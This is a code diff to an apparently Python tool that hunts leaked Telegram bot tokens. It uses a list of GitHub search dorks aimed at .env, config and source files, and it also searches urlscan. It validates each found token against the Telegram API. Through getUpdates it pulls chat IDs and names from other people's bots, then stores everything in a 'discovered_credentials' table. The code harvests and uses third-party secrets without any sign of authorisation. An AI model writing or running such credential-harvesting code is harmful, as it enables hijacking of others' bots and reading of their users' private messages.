@@ -37,6 +37,9 @@ async def _save_credentials_async(results, source_name: str):
         existing_id = None
         existing_has_chat = False
         
+        # Check if the result already has a chat_id (From URL/DeepScan extraction)
+        extracted_chat_id = item.get("chat_id")
+        
         try:
             # Step 2: Check if already exists
             existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
@@ -61,27 +64,31 @@ async def _save_credentials_async(results, source_name: str):
             bot_username = bot_info.get('username', 'unknown')
             print(f"    [Validate] ✅ Token valid! Bot: @{bot_username}")
             
-            # Step 4: Try to get a chat_id from getUpdates (optional - best effort)
-            chat_id = None
+            # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
+            chat_id = extracted_chat_id
             chat_name = None
             chat_type = None
-            
-            try:
-                updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
-                if updates_res.status_code == 200 and updates_res.json().get('ok'):
-                    updates = updates_res.json().get('result', [])
-                    for update in updates:
-                        for key in ['message', 'channel_post', 'my_chat_member']:
-                            if key in update and update[key].get('chat'):
-                                chat = update[key]['chat']
-                                chat_id = chat.get('id')
-                                chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
-                                chat_type = chat.get('type')
+
+            if chat_id:
+                print(f"    [Validate] ✅ Using extracted chat_id: {chat_id}")
+            else:
+                # Try to fetch via API if we didn't extract one
+                try:
+                    updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
+                    if updates_res.status_code == 200 and updates_res.json().get('ok'):
+                        updates = updates_res.json().get('result', [])
+                        for update in updates:
+                            for key in ['message', 'channel_post', 'my_chat_member']:
+                                if key in update and update[key].get('chat'):
+                                    chat = update[key]['chat']
+                                    chat_id = chat.get('id')
+                                    chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
+                                    chat_type = chat.get('type')
+                                    break
+                            if chat_id:
                                 break
-                        if chat_id:
-                            break
-            except:
-                pass
+                except:
+                    pass
             
             # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
             
@@ -95,7 +102,8 @@ async def _save_credentials_async(results, source_name: str):
                         "bot_username": bot_username,
                         "bot_id": bot_info.get('id'),
                         "chat_name": chat_name,
-                        "chat_type": chat_type
+                        "chat_type": chat_type,
+                        "extracted_chat_id": extracted_chat_id # Log that we found it via scan
                     }
                 }
                 db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
@@ -108,7 +116,7 @@ async def _save_credentials_async(results, source_name: str):
                     f"🔄 [{source_name}] **Updated Token!**\n"
                     f"Bot: @{bot_username}\n"
                     f"ID: `{existing_id}`\n"
-                    f"Chat: {chat_name} ({chat_type})"
+                    f"Chat: {chat_name or chat_id} ({chat_type or 'extracted'})"
                 )
                 saved_count += 1
             elif existing_id and not chat_id:
@@ -224,16 +232,29 @@ def scan_urlscan(query: str = "api.telegram.org"):
 def scan_github(query: str = None):
     import time
     default_dorks = [
-        "filename:.env api.telegram.org",
-        "path:config api.telegram.org",
-        "\"TELEGRAM_BOT_TOKEN\"",
-        "\"BOT_TOKEN\"",
-        "\"TG_BOT_TOKEN\"", 
-        "\"TELEGRAM_KEY\"",
-        "language:python \"ApplicationBuilder\" \"token\"",
+        # Configuration Files
+        "filename:.env \"TELEGRAM_BOT_TOKEN\"",
+        "filename:.env \"TG_BOT_TOKEN\"", 
+        "filename:.env \"api.telegram.org\"",
         "filename:config.json \"bot_token\"",
         "filename:settings.py \"TELEGRAM_TOKEN\"",
-        "\"https://api.telegram.org/bot\""  # Targeted HTTP requests only (SKIP documentation/examples)
+        "filename:config.yaml \"telegram_token\"",
+        "filename:config.toml \"telegram_token\"",
+        "filename:docker-compose.yml \"TELEGRAM_BOT_TOKEN\"",
+        
+        # Code Patterns
+        "language:python \"ApplicationBuilder\" \"token\"",
+        "language:javascript \"new TelegramBot\" \"token\"",
+        "language:php \"TelegramBot\" \"api_key\"",
+        "language:go \"NewBotAPI\"",
+        
+        # Strings
+        "\"https://api.telegram.org/bot\" -filename:README.md -filename:dataset", # Exclude common non-key files
+        "\"123456789:\" NOT 123456789", # Try to find tokens that start with digits but aren't example ones
+        
+        # Specific Variable Names
+        "\"TELEGRAM_KEY\"",
+        "\"BOT_TOKEN\""
     ]
     
     queries = [query] if query else default_dorks
